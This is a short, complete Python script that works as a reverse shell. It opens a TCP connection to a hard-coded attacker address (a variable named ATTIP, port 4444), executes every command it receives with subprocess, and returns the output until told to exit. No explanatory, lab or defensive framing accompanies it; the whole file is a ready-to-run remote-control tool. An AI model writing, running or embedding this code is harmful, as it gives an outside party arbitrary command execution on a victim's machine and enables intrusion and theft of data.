import socket
import subprocess

ATTIP = '192.168.0.179'
ATTPORT = 4444

def connect():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ATTIP, ATTPORT))
    while(True):
        command = sock.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        sock.send(output.encode())
    sock.close()

if __name__ == '__main__':
    connect()
